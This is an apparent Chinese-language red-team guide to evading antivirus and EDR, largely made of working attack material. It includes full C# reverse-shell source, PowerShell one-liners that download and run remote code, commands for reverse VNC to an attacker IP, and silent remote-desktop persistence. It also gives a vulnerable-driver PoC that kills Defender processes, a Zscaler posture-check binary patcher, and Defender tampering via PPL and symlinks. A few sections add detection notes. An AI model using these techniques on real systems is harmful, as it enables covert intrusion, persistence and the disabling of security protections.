由于 payload 将直接加载到内存中而不会接触磁盘，我们只需要考虑为整个进程 patch AMSI。

大多数 C2 frameworks（sliver、Covenant、metasploit、CobaltStrike、Havoc 等）已经提供了直接在内存中执行 C# assemblies 的能力，但实现方式有多种：

- **Fork\&Run**

该方式包括**生成一个新的 sacrificial process**，将 post-exploitation malicious code 注入该新进程，执行 malicious code，并在完成后终止新进程。这种方式既有优点，也有缺点。Fork and run 方法的优点是，执行发生在我们的 **Beacon implant 进程之外**。这意味着如果 post-exploitation 操作中出现问题或被捕获，我们的 **implant 存活的可能性要大得多**。缺点是，被 **Behavioural Detections** 捕获的可能性也**更高**。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

该方式是将 post-exploitation malicious code **注入其自身进程**。这样可以避免创建新进程并被 AV 扫描，但缺点是，如果 payload 执行过程中出现问题，**Beacon 丢失的可能性要大得多**，因为它可能会崩溃。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 如果你想进一步了解 C# Assembly loading，请查看这篇文章 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 以及他们的 InlineExecute-Assembly BOF（[https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)）。

你也可以**从 PowerShell** 加载 C# Assemblies，请查看 [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) 和 [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk)。

## Using Other Programming Languages

正如 [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) 中所述，可以通过让受感染机器访问**安装在 Attacker Controlled SMB share 上的 interpreter environment**，使用其他语言执行 malicious code。

通过允许访问 SMB share 上的 Interpreter Binaries 和 environment，你可以在受感染机器的**内存中执行这些语言的任意代码**。

该 repo 指出：Defender 仍然会扫描 scripts，但通过利用 Go、Java、PHP 等语言，我们可以**更灵活地绕过静态 signatures**。使用这些语言中随机且未 obfuscated 的 reverse shell scripts 进行测试已经证明是成功的。

## TokenStomping

Token stomping 是一种允许攻击者**操纵 access token 或 EDR、AV 等安全产品**的技术，使其权限降低，从而让进程不会终止，但也没有权限检查恶意活动。

为防止这种情况，Windows 可以**阻止外部进程**获取安全进程 token 的 handles。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

正如[**这篇博客文章**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)所述，只需在受害者的 PC 上部署 Chrome Remote Desktop，然后利用它接管该 PC 并维持 persistence 即可：
1. 从 https://remotedesktop.google.com/ 下载，点击 "Set up via SSH"，然后点击 Windows 的 MSI 文件以下载 MSI 文件。
2. 在受害者机器上静默运行 installer（需要 admin 权限）：`msiexec /i chromeremotedesktophost.msi /qn`
3. 返回 Chrome Remote Desktop 页面并点击 next。随后 wizard 会要求你进行授权；点击 Authorize button 继续。
4. 对给定 parameter 做一些调整后执行：`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（注意 pin param，它允许你设置 pin，而无需使用 GUI）。


## Advanced Evasion

Evasion 是一个非常复杂的主题，有时你必须在单个系统中考虑许多不同的 telemetry sources，因此在成熟环境中保持完全 undetected 基本上是不可能的。

你所面对的每个环境都有其自身的优点和缺点。

我强烈建议你观看 [@ATTL4S](https://twitter.com/DaniLJ94) 的这场演讲，以了解更多 Advanced Evasion techniques。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

这也是 [@mariuszbit](https://twitter.com/mariuszbit) 关于 Evasion in Depth 的另一场精彩演讲。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

你可以使用 [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)，它会**持续移除 binary 的部分内容**，直到**找出 Defender 判定为 malicious 的部分**，并将其拆分出来。\
另一个执行**相同操作的工具是** [**avred**](https://github.com/dobin/avred)，其在 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) 提供开放 Web 服务。

### **Telnet Server**

在 Windows10 之前，所有 Windows 都自带一个可以安装的 **Telnet server**，你可以（以 administrator 身份）执行：
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
使其在系统启动时**启动**，并立即运行它：
```bash
sc config TlntSVR start= auto obj= localsystem
```
**更改 telnet 端口**（隐蔽）并禁用防火墙：
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

从这里下载：[http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)（需要下载 bin，而不是 setup）

**在主机上**：执行 _**winvnc.exe**_ 并配置 server：

- 启用选项 _Disable TrayIcon_
- 在 _VNC Password_ 中设置密码
- 在 _View-Only Password_ 中设置密码

然后，将 binary _**winvnc.exe**_ 和**新创建的**文件 _**UltraVNC.ini**_ 移动到**受害者主机**

#### **Reverse connection**

**攻击者**应在其**主机中执行** binary `vncviewer.exe -listen 5900`，使其准备好接收 reverse **VNC connection**。然后，在**受害者主机中**：启动 winvnc daemon `winvnc.exe -run`，并运行 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**警告：** 为保持 stealth，不应执行以下操作：

- 如果 `winvnc` 已在运行，不要再次启动它，否则会触发一个 [popup](https://i.imgur.com/1SROTTl.png)。使用 `tasklist | findstr winvnc` 检查它是否正在运行
- 不要在同一目录中没有 `UltraVNC.ini` 的情况下启动 `winvnc`，否则会打开 [配置窗口](https://i.imgur.com/rfMQWcf.png)
- 不要运行 `winvnc -h` 获取帮助，否则会触发一个 [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

从这里下载：[https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
在 GreatSCT 内部：
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
现在使用 `msfconsole -r file.rc` **启动 lister**，并使用以下命令执行 **xml payload**：
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Current Defender will terminate the process very fast.**

### 编译我们自己的 reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### First C# Revershell

使用以下命令编译：
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
与以下内容一起使用：
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### 使用 C# 编译器
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自动下载和执行：
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# 混淆器列表：[https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### 使用 python 构建 injectors 示例：

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 其他工具
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### 更多

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – 从内核空间终止 AV/EDR

Storm-2603 利用一个名为 **Antivirus Terminator** 的微型控制台工具，在投放 ransomware 之前禁用 endpoint protections。该工具携带其**自有的易受攻击但*已签名*的 driver**，并滥用它执行特权 kernel operations，即使 Protected-Process-Light (PPL) AV services 也无法阻止。

主要要点
1. **Signed driver**：写入磁盘的文件是 `ServiceMouse.sys`，但其 binary 实际上是 Antiy Labs“System In-Depth Analysis Toolkit”中的合法 signed driver `AToolsKrnl64.sys`。由于该 driver 带有有效的 Microsoft signature，即使启用了 Driver-Signature-Enforcement (DSE)，它也能被加载。
2. **Service installation**：
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
第一行将该 driver 注册为 **kernel service**，第二行启动它，使 `\\.\ServiceMouse` 可从 user land 访问。
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | 按 PID 终止任意 process（用于终止 Defender/EDR services） |
| `0x990000D0` | 删除磁盘上的任意 file |
| `0x990001D0` | 卸载 driver 并移除 service |

Minimal C proof-of-concept：
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**：BYOVD 完全绕过 user-mode protections；在 kernel 中执行的 code 可以打开 *protected* processes、终止它们，或篡改 kernel objects，而不受 PPL/PP、ELAM 或其他 hardening features 的影响。

Detection / Mitigation
• 启用 Microsoft 的 vulnerable-driver block list（`HVCI`、`Smart App Control`），使 Windows 拒绝加载 `AToolsKrnl64.sys`。
• 监控新建 *kernel* services，并在 driver 从 everyone-writable directory 加载或不在 allow-list 中时发出警报。
• 监控指向 custom device objects 的 user-mode handles，随后检查可疑的 `DeviceIoControl` calls。

### 通过磁盘上的 Binary Patching 绕过 Zscaler Client Connector Posture Checks

Zscaler 的 **Client Connector** 在本地应用 device-posture rules，并依赖 Windows RPC 将结果传递给其他 components。两个薄弱的 design choices 使完全 bypass 成为可能：

1. Posture evaluation **完全在 client-side 进行**（向 server 发送一个 boolean）。
2. Internal RPC endpoints 只验证连接 executable 是否 **signed by Zscaler**（通过 `WinVerifyTrust`）。

通过**对磁盘上的四个 signed binaries 进行 patching**，可以同时 neutralise 这两种机制：

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 始终返回 `1`，因此每项 check 都符合要求 |
| `ZSAService.exe` | 对 `WinVerifyTrust` 的 indirect call | 被 NOP-ed ⇒ 任意（甚至 unsigned）process 都可以绑定到 RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | 替换为 `mov eax,1 ; ret` |
| `ZSATunnel.exe` | tunnel 上的 integrity checks | 被 short-circuited |

Minimal patcher excerpt：
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
替换原始文件并重启 service stack 后：

* **所有** posture checks 均显示为 **green/compliant**。
* 未签名或已修改的 binaries 可以打开 named-pipe RPC endpoints（例如 `\\RPC Control\\ZSATrayManager_talk_to_me`）。
* 被攻陷的 host 获得对 Zscaler policies 定义的内部 network 的 unrestricted access。

本 case study 展示了如何通过几处 byte patches，击败纯 client-side trust decisions 和简单的 signature checks。

## 利用 Protected Process Light (PPL) 通过 LOLBINs 篡改 AV/EDR

Protected Process Light (PPL) 强制实施 signer/level hierarchy，使得只有 protection level 相同或更高的 protected processes 才能相互篡改。从 offensive 角度看，如果你能够合法启动一个启用了 PPL 的 binary 并控制其 arguments，就可以将 benign functionality（例如 logging）转换为一种受约束、由 PPL 支持的 write primitive，用于写入 AV/EDR 使用的 protected directories。

使 process 以 PPL 运行的条件
- 目标 EXE（以及所有 loaded DLLs）必须使用具备 PPL 能力的 EKU 签名。
- 必须使用以下 flags，通过 CreateProcess 创建 process：`EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
- 必须请求与 binary signer 匹配的 protection level（例如，anti-malware signers 使用 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`，Windows signers 使用 `PROTECTION_LEVEL_WINDOWS`）。错误的 levels 将导致创建失败。

另请参阅关于 PP/PPL 和 LSASS protection 的更广泛介绍：

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper：CreateProcessAsPPL（选择 protection level 并将 arguments 转发给目标 EXE）：
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern：
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN 原语：ClipUp.exe
- 签名系统二进制文件 `C:\Windows\System32\ClipUp.exe` 会自行生成进程，并接受一个参数，将日志文件写入调用者指定的路径。
- 当作为 PPL 进程启动时，文件写入会获得 PPL backing。
- ClipUp 无法解析包含空格的路径；请使用 8.3 短路径指向通常受保护的位置。

8.3 短路径辅助方法
- 列出短名称：在每个父目录中运行 `dir /x`。
- 在 cmd 中推导短路径：`for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain（抽象）
1) 使用 launcher（例如 CreateProcessAsPPL）并通过 `CREATE_PROTECTED_PROCESS` 启动支持 PPL 的 LOLBIN（ClipUp）。
2) 传入 ClipUp 的日志路径参数，强制在受保护的 AV 目录中创建文件（例如 Defender Platform）。必要时使用 8.3 短名称。
3) 如果目标二进制文件在运行时通常会被 AV 打开或锁定（例如 MsMpEng.exe），则通过安装一个能够可靠地更早运行的 auto-start service，在启动时 AV 启动之前安排写入。使用 Process Monitor（boot logging）验证启动顺序。
4) 重启时，PPL-backed 写入会在 AV 锁定其二进制文件之前发生，从而破坏目标文件并阻止其启动。

示例调用（为安全起见已隐藏/缩短路径）：
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
注意事项和限制
- 你无法控制 ClipUp 写入的内容，只能控制其放置位置；该 primitive 适合用于破坏，而不是精确注入内容。
- 需要 local admin/SYSTEM 权限才能安装/启动 service，并且需要可用的 reboot 窗口。
- 时机至关重要：目标文件不能处于打开状态；boot-time execution 可避免 file locks。

检测
- 进程创建 `ClipUp.exe` 时使用了异常 arguments，尤其是由非标准 launcher 作为 parent，并且发生在 boot 附近。
- 新建的 service 被配置为 auto-start 可疑 binary，并且始终在 Defender/AV 之前启动。调查 Defender startup failure 之前的 service 创建/修改操作。
- 对 Defender binary/Platform directory 进行 file integrity monitoring；关注由带有 protected-process flags 的 process 意外创建/修改文件。
- ETW/EDR telemetry：查找使用 `CREATE_PROTECTED_PROCESS` 创建的 process，以及非 AV binary 异常使用 PPL level 的情况。

缓解措施
- WDAC/Code Integrity：限制哪些 signed binary 可以作为 PPL 运行，以及允许哪些 parent；阻止在非 legitimate context 中调用 ClipUp。
- Service hygiene：限制 auto-start service 的创建/修改，并监控 start-order manipulation。
- 确保 Defender tamper protection 和 early-launch protection 已启用；调查表明 binary corruption 的 startup error。
- 如果与你的环境兼容，可以考虑在承载 security tooling 的 volume 上禁用 8.3 short-name generation（务必进行充分测试）。

PPL 和 tooling 参考
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## 通过 Platform Version Folder Symlink Hijack 篡改 Microsoft Defender

Windows Defender 通过枚举以下路径下的子目录来选择其运行的平台：
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

它会选择 lexicographic version string 最高的子目录（例如 `4.18.25070.5-0`），然后从该目录启动 Defender service process（并相应更新 service/registry path）。此选择信任 directory entry，包括 directory reparse point（symlink）。Administrator 可以利用这一点，将 Defender 重定向到 attacker-writable path，从而实现 DLL sideloading 或 service disruption。

前置条件
- Local Administrator（需要在 Platform folder 下创建 directory/symlink）
- 能够 reboot 或触发 Defender platform re-selection（boot 时进行 service restart）
- 只需要使用 built-in tools（mklink）

工作原理
- Defender 会阻止在其自身 folder 中写入，但其 platform selection 信任 directory entry，并在未验证目标是否解析到受保护/可信 path 的情况下，选择 lexicographically 最高的 version。

分步操作（示例）
1) 准备当前 platform folder 的可写 clone，例如 `C:\TMP\AV`：
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) 在 Platform 中创建一个指向你的文件夹的更高版本目录 symlink：
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) 触发器选择（建议重启）：
```cmd
shutdown /r /t 0
```
4) 验证 MsMpEng.exe (WinDefend) 是否从重定向路径运行：
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
你应在 `C:\TMP\AV\` 下观察到新的进程路径，并看到 service 配置/registry 反映该位置。

Post-exploitation 选项
- DLL sideloading/code execution：放置/替换 Defender 从其 application directory 加载的 DLL，以便在 Defender 的进程中执行代码。请参阅上方的：[DLL Sideloading & Proxying](#dll-sideloading--proxying)。
- Service kill/denial：删除 version-symlink，使得下次启动时 configured path 无法解析，导致 Defender 启动失败：
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Note that 此 technique does not provide privilege escalation by itself; it requires admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams 可以将 runtime evasion 从 C2 implant 中移出，并通过 hooking 目标 module 的 Import Address Table (IAT)，将选定的 APIs 路由到 attacker-controlled、position-independent code (PIC) 中。这样可以将 evasion 扩展到许多 kits 所暴露的小范围 API surface 之外（例如 CreateProcessA），并将相同的 protections 扩展到 BOFs 和 post-exploitation DLLs。

High-level approach
- 使用 reflective loader 将 PIC blob 与目标 module 一同 stage（prepend 或 companion）。PIC 必须 self-contained 且 position-independent。
- 当 host DLL 加载时，遍历其 IMAGE_IMPORT_DESCRIPTOR，并 patch 目标 imports 的 IAT entries（例如 CreateProcessA/W、CreateThread、LoadLibraryA/W、VirtualAlloc），使其指向由 attacker 控制的 thin PIC wrappers。
- 每个 PIC wrapper 在 tail-calling real API address 之前执行 evasions。典型 evasions 包括：
- 在 call 前后执行 Memory mask/unmask（例如 encrypt beacon regions、RWX→RX、更改 page names/permissions），然后在 call 后 restore。
- Call-stack spoofing：构造 benign stack，并 transition 到 target API，使 call-stack analysis 解析到预期的 frames。
- 为确保 compatibility，export 一个 interface，以便 Aggressor script（或 equivalent）能够为 Beacon、BOFs 和 post-ex DLLs 注册要 hook 的 APIs。

Why IAT hooking here
- 对所有使用被 hooked import 的 code 都有效，无需修改 tool code，也不依赖 Beacon 来 proxy 特定 APIs。
- 覆盖 post-ex DLLs：hooking LoadLibrary* 允许你 intercept module loads（例如 System.Management.Automation.dll、clr.dll），并将相同的 masking/stack evasion 应用到它们的 API calls。
- 通过 wrapping CreateProcessA/W，恢复针对基于 call-stack 的 detections 使用 process-spawning post-ex commands 的可靠性。

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- 在 relocations/ASLR 之后、首次使用 import 之前应用 patch。像 TitanLdr/AceLdr 这样的 Reflective loaders 展示了如何在已加载模块的 DllMain 期间执行 hooking。
- 保持 wrappers 简短且 PIC-safe；通过 patching 前捕获的原始 IAT 值，或通过 LdrGetProcedureAddress 解析真实 API。
- 对 PIC 使用 RW → RX 转换，并避免留下可写且可执行的页面。

Call‑stack spoofing stub
- Draugr-style PIC stubs 构造伪造的调用链（将返回地址指向 benign modules），然后 pivot 到真实 API。
- 这可以绕过那些要求 Beacon/BOFs 到敏感 API 之间具有 canonical stacks 的检测。
- 与 stack cutting/stack stitching techniques 配合，在 API prologue 之前进入预期的 frames。

Operational integration
- 将 reflective loader 加到 post-ex DLL 的前部，使 PIC 和 hooks 在 DLL 加载时自动初始化。
- 使用 Aggressor script 注册目标 APIs，使 Beacon 和 BOFs 无需修改代码即可透明地使用相同的 evasion path。

Detection/DFIR considerations
- IAT integrity：解析到 non-image（heap/anon）地址的 entries；定期验证 import pointers。
- Stack anomalies：返回地址不属于已加载 images；突然转换到 non-image PIC；RtlUserThreadStart ancestry 不一致。
- Loader telemetry：进程内对 IAT 的写入；在早期 DllMain activity 中修改 import thunks；加载时创建了异常的 RX regions。
- Image-load evasion：如果 hooking LoadLibrary*，监控与 memory masking events 相关的 automation/clr assemblies 可疑加载。

Related building blocks and examples
- 在加载期间执行 IAT patching 的 reflective loaders（例如 TitanLdr、AceLdr）
- Memory masking hooks（例如 simplehook）和 stack-cutting PIC（stackcutting）
- PIC call-stack spoofing stubs（例如 Draugr）


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

如果你控制一个 reflective loader，可以在 `ProcessImports()` 期间通过将 loader 的 `GetProcAddress` pointer 替换为会优先检查 hooks 的 custom resolver 来 hook imports：

- 构建一个 **resident PICO**（persistent PIC object），使其在 transient loader PIC 释放自身后仍然存活。
- Export 一个 `setup_hooks()` function，用于覆盖 loader 的 import resolver（例如 `funcs.GetProcAddress = _GetProcAddress`）。
- 在 `_GetProcAddress` 中跳过 ordinal imports，并使用基于 hash 的 hook lookup，例如 `__resolve_hook(ror13hash(name))`。如果存在 hook，则返回它；否则委托给真实的 `GetProcAddress`。
- 在 link time 使用 Crystal Palace 的 `addhook "MODULE$Func" "hook"` entries 注册 hook targets。由于 hook 位于 resident PICO 内，因此会持续有效。

这样即可实现 **import-time IAT redirection**，而无需在加载后 patching loaded DLL 的 code section。

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks 只有在目标函数实际位于 target 的 IAT 中时才会触发。如果模块通过 PEB-walk + hash 解析 APIs（没有 import entry），则强制添加真实 import，使 loader 的 `ProcessImports()` path 能够看到它：

- 将 hashed export resolution（例如 `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`）替换为类似 `&WaitForSingleObject` 的 direct reference。
- 编译器会生成 IAT entry，使 reflective loader 在解析 imports 时能够进行 interception。

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

不要 patch `Sleep`，而应 hook implant 实际使用的 **wait/IPC primitives**（`WaitForSingleObject(Ex)`、`WaitForMultipleObjects`、`ConnectNamedPipe`）。对于长时间 waits，使用 Ekko-style obfuscation chain 包装调用，在 idle 期间加密内存中的 image：

- 使用 `CreateTimerQueueTimer` 安排一系列 callbacks，通过带有 crafted `CONTEXT` frames 的 `NtContinue` 调用来执行。
- 典型 chain（x64）：将 image 设置为 `PAGE_READWRITE` → 通过 `advapi32!SystemFunction032` 对完整 mapped image 执行 RC4 加密 → 执行 blocking wait → RC4 解密 → 通过遍历 PE sections **恢复每个 section 的 permissions** → signal completion。
- `RtlCaptureContext` 提供 template `CONTEXT`；将其 clone 到多个 frames，并设置 registers（`Rip/Rcx/Rdx/R8/R9`）以调用每个步骤。

